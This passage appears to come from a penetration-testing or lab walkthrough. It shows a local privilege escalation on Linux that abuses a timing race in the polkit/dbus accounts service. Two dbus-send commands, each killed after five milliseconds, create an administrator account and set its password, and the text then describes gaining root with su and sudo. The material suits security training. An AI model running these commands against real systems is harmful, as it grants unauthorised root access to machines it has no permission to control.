This attempts to create our new account, and times how long it takes for the command to finish. In the target machine this should be about 11 miliseconds:

We now need to take the same message, send it, then cut it off at about halfway through execution. 5 milliseconds tends to work fairly for this box:

```bash
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1 & sleep 0.005s; kill $!
```

We can then check to see if a new attacker account has been created (```id attacker```)

Now we need to set a password for this account. We use exactly the same technique here, but with a different dbus message. Whatever delay worked last time should also work here:

```bash
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1000 org.freedesktop.Accounts.User.SetPassword string:'pass hash' string:'Ask the pentester' & sleep 0.005s; kill $!
```

This will set the password of our new account to **Expl01ted** -- all ready for us to just su then sudo -s our way to root!

And with that we are done!

## Wrapping Up

Now will all our findings we need to write our report to the client and we're done with this one.
